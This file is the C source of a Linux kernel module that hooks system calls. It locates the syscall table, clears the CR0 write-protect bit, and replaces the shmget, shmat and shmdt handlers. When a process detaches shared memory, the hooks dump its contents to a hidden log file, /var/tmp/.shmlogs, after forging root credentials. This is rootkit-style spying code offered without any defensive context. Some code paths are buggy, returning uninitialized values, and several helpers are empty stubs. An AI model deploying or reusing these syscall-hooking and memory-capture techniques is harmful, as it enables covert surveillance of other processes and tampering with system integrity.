#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/ipc.h>
#include <linux/syscalls.h>
#include <linux/kprobes.h>
#include <linux/string.h>
#include <linux/slab.h>

#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/fcntl.h>
#include <asm/processor.h>

#include <linux/mutex.h>

long orig_cr0;

#define unprotect_memory() \
({ \
	orig_cr0 =  read_cr0();\
	write_cr0(orig_cr0 & (~ 0x10000)); /* Set WP flag to 0 */ \
});

#define protect_memory() \
({ \
	write_cr0(orig_cr0); /* Set WP flag to 1 */ \
});

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
#define SYSCALL_NAME(name) ("__x64_sys_" name)
#else
#define SYSCALL_NAME(name) ("sys_" name)
#endif

#define LOGFILE         "/var/tmp/.shmlogs"

/** SHM manipulation **/
// not used yet
typedef struct _shm_entry {
    int shmid;
    long size;
    int nb_processes;
    int array_max_size;             // user addresses array max size
    int creator_pid;
    char * __user *useraddrs;       // we cannot just store the userspace addr of creator because he can dettach 
                                    // and the other processes attached could continue to write on this area without
                                    // us able to see it.

} shm_entry;

typedef struct _shm_table {
    int nb_shm_areas;
    struct _shm_entry *infos;   
} shm_table;

shm_entry *
alloc_entry(int shmid, long size)
{
    return NULL;
}

int
add_entry(shm_table *t, shm_entry *e)
{
    return -1;
}

int
delete_entry(shm_table *t, int shmid)
{
    return -1;
}

int
add_user_addr(shm_table *t, int shmid, char * __user addr)
{
    return -1;
}

int
delete_user_addr(shm_table *t, int shmid)
{
    return -1;
}

/** UTILS **/
struct cred oldcreds;
//static DEFINE_MUTEX(lock);
void 
enter_root_ctx(void)
{
    /*
    if (mutex_lock_interruptible(&lock) < 0)
        return;
    */
    struct cred *creds;

    creds = prepare_creds();
    if (!creds)
    {
        //mutex_unlock(&lock);
        return;
    }
    memcpy(&oldcreds, creds, sizeof(struct cred));
    
    creds->uid.val = creds->gid.val = 0;
    creds->euid.val = creds->egid.val = 0;
    creds->suid.val = creds->sgid.val = 0;
    creds->fsuid.val = creds->fsgid.val = 0;

    commit_creds(creds);
}

void
leave_root_ctx(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (!newcreds)
        return;
    newcreds->uid.val = newcreds->gid.val = oldcreds.uid.val;
    newcreds->euid.val = newcreds->egid.val = oldcreds.euid.val;
    newcreds->suid.val = newcreds->sgid.val = oldcreds.suid.val;
    newcreds->fsuid.val = newcreds->fsgid.val = oldcreds.fsuid.val;

    commit_creds(newcreds);
    //mutex_unlock(&lock);
}

struct file *file_open(const char *path, int flags, int rights) 
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
} 

void
log_msg(const char *msg)
{
    struct file *fd;

    enter_root_ctx();   
    fd = file_open(LOGFILE, O_RDWR|O_APPEND|O_CREAT, 0600);
    if (fd == NULL)
    {
        printk(KERN_ERR "Unable to open file %s\n", LOGFILE);
        return;
    }

    if (file_write(fd, 0, msg, strlen(msg)) < 0)
    {
        printk(KERN_ERR "Unable write file\n", LOGFILE);
        return;
    }

    filp_close(fd, NULL);
    leave_root_ctx();
}

int
is_meaningfull(char c)
{
    return (c > 32 && c < 127); 
}

void
mem_print_strings(void *buffer, size_t size, int logtofile)
{
    size_t i;
    char *s;
    char *tmp, *finalstr;

    s = (char*) buffer;
    i = 0;
    finalstr = kzalloc(size+1, GFP_KERNEL);
    if (!finalstr)
        return;
    while (i < size)
    {
        if (is_meaningfull(s[i]))
        {
            strncat(finalstr, s+i, size-i);
            strcat(finalstr, "\n");
            i += strnlen(s + i, size-i);
        }
        i++;
    }
    if (logtofile)
    {
        strcat(finalstr, "\n");
        log_msg(finalstr);
    }
    else
        printk(KERN_INFO "%s\n", finalstr);
}

void
mem_print_hexa(void *buffer, size_t size, int logtofile)
{
    int n_per_line;
    char *s, *finalstr;
    size_t i;

    finalstr = kzalloc(size * 3 + 2, GFP_KERNEL);
    if (!finalstr)
        return;
    s = buffer;
    n_per_line = 16;
    for (i = 0; i < size; i++)
    {
        char tmp[4];
        if (((i+1) % n_per_line) == 0)
            snprintf(tmp, sizeof tmp, "%02x\n", s[i]);
        else
            snprintf(tmp, sizeof tmp, "%02x ", s[i]);
        strncat(finalstr, tmp, strlen(tmp));
    }
    if (logtofile)
    {
        strcat(finalstr, "\n");
        log_msg(finalstr);
    }
    else
        printk(KERN_INFO "%s\n", finalstr);
}

// for now only track 1 shared memory area (last one created)
int g_shmid = -1;
long g_size = -1;
char * __user g_addr = NULL;

/** HOOKS **/
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage int (*orig_shmget) (const struct pt_regs*);
static asmlinkage void* (*orig_shmat) (const struct pt_regs*);
static asmlinkage int (*orig_shmdt) (const struct pt_regs*);

asmlinkage int
hook_shmget(const struct pt_regs *regs)
{
    int ret;
    printk(KERN_INFO "Hook shmget:\n");
    printk(KERN_INFO "Query type: %s\n", (regs->di == IPC_PRIVATE) ? "Creation & Get" : "Get");
    printk(KERN_INFO "Size asked: %lu\n", regs->si);
    ret = orig_shmget(regs);
    if (ret != -1)
    {
        printk(KERN_INFO "Shm ID: %d\n", ret);
        g_shmid = ret;
        g_size = regs->si;
    }
    else
        printk(KERN_INFO "=> Query failed\n");

    return ret;
}

asmlinkage void*
hook_shmat(const struct pt_regs *regs)
{
    int shmid, shflg;
    char __user *ret;
    char __user *shmaddr;

    shmid = regs->di;
    shmaddr = (char*) regs->si;
    shflg = regs->dx;

    ret = orig_shmat(regs);
    if (ret != NULL && shmid == g_shmid)
    {
        g_addr = ret;
        printk(KERN_INFO "Shared memory attached for shmid=%d on addr %lx\n", shmid, (unsigned long)shmaddr);
    }
    return ret;
}

asmlinkage int
hook_shmdt(const struct pt_regs *regs)
{
    int ret;
    char __user *shmaddr;

    shmaddr = (char*) regs->di;

    if (shmaddr == g_addr)
    {
        char *kbuf;
        long err;
        kbuf = kzalloc(g_size, GFP_KERNEL);
        if (!kbuf)
            return ret;

        printk(KERN_INFO "Shared memory Detach on shmid=%d\n", g_shmid);
        if ((err = copy_from_user(kbuf, g_addr, g_size)) > 0)
            printk(KERN_INFO "Error: cannot copied %ld bytes from user addr 0x%lx\n", err, (unsigned long) g_addr);

        printk(KERN_INFO "Memory dump:\n");
        mem_print_hexa(kbuf, g_size, 1);
        printk(KERN_INFO "Strings in memory:\n");
        mem_print_strings(kbuf, g_size, 1);

        kfree(kbuf);
    }
    return orig_shmdt(regs);
}

#else
static asmlinkage int (*orig_shmget) (key_t, size_t, int);
static asmlinkage void* (*orig_shmat) (int, void __user *, int);
static asmlinkage int (*orig_shmdt) (const void __user *);

asmlinkage int
hook_shmget(key_t key, size_t size, int shmflg)
{
    int ret;
    printk(KERN_INFO "Hook shmget:\n");
    printk(KERN_INFO "Query type: %s\n", (key == IPC_PRIVATE) ? "Creation & Get" : "Get");
    printk(KERN_INFO "Size asked: %lu\n", size);
    ret = orig_shmget(key, size, shmflg);
    if (ret != -1)
        printk(KERN_INFO "Shm ID: %d\n", ret);
    else
        printk(KERN_INFO "=> Query failed\n");

    return ret;
}

asmlinkage void*
hook_shmat(int shmid, void __user * shmaddr, int shflg)
{
    char __user *ret;
    ret = orig_shmat(shmid, shmaddr, shflg);
    if (ret != NULL && shmid == g_shmid)
    {
        g_addr = shmaddr;
        printk(KERN_INFO "Shared memory attached for shmid=%d on addr 0x%lx\n", shmid, (unsigned long)shmaddr);
    }
    return ret;
}

asmlinkage int
hook_shmdt(const void __user *shmaddr)
{
    int ret;

    if (shmaddr == g_addr)
    {
        char *kbuf;
        long err;
        kbuf = kzalloc(g_size, GFP_KERNEL);
        if (!kbuf)
            return ret;

        printk(KERN_INFO "Shared memory Detach on shmid=%d\n", g_shmid);
        if ((err = copy_from_user(kbuf, g_addr, g_size)) > 0)
            printk(KERN_INFO "Error: cannot copied %ld bytes from user addr 0x%lx\n", err, g_addr);

        printk(KERN_INFO "Memory dump:\n");
        mem_print_hexa(kbuf, g_size, 1);
        printk(KERN_INFO "Strings in memory:\n");
        mem_print_strings(kbuf, g_size, 1);

        kfree(kbuf);
    }
    return orig_shmdt(shmaddr);
}

#endif


static unsigned long *
get_syscall_table_addr(void)
{
    unsigned long *st;
    st = NULL;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif

    st = (unsigned long *) kallsyms_lookup_name("sys_call_table");

    return st;
}

unsigned long *st = NULL;
int __init module_load(void)
{
    //mutex_init(&lock);

    st = get_syscall_table_addr();
    if (!st)
        return -1;

    orig_shmget = st[__NR_shmget];
    orig_shmat = st[__NR_shmat];
    orig_shmdt = st[__NR_shmdt];
    
    unprotect_memory();
    st[__NR_shmget] = (unsigned long) hook_shmget;
    st[__NR_shmat] = (unsigned long) hook_shmat;
    st[__NR_shmdt] = (unsigned long) hook_shmdt;
    protect_memory();
    printk (KERN_INFO "Hooks installed on shmget/shmat/shmdt\n");

    return 0;
}

void __exit module_unload(void)
{
    unprotect_memory();
    st[__NR_shmget] = (unsigned long) orig_shmget;
    st[__NR_shmat] = (unsigned long) orig_shmat;
    st[__NR_shmdt] = (unsigned long) orig_shmdt;
    protect_memory();
    //mutex_destroy(&lock);

    printk(KERN_INFO "Original shmget/shmat/shmdt syscalls restored\n");
}

module_init(module_load);
module_exit(module_unload);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("yocvito");
MODULE_DESCRIPTION("another funny module");
MODULE_VERSION("0.01");